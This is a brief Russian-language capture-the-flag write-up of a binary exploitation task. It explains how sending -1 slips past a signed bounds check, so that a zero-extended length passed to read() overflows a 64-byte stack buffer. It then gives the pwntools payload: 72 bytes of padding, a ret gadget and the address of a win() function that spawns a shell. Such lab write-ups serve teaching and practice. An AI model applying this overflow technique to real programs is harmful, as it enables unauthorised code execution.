Дан бинарник с функцией vuln. Она читает число через scanf в short (16-битное знаковое), затем проверяет if (ax > 0x3f) — но инструкция jg делает знаковое сравнение. После этого число передаётся в read() через movzwl (zero-extend до unsigned).
Если отправить -1, проверка пропускает его (-1 < 63 знаково), но read() получает 65535 байт — огромный buffer overflow.
В бинаре есть функция win() по адресу 0x401186, которая сразу вызывает system("/bin/sh"). Буфер 64 байта + 8 байт saved rbp = 72 байта паддинга, потом ret-гаджет для выравнивания стека и адрес win.
pythonpayload = b'A' * 72 + p64(0x401016) + p64(0x401186)
p.sendline(b'-1')
p.sendline(payload)
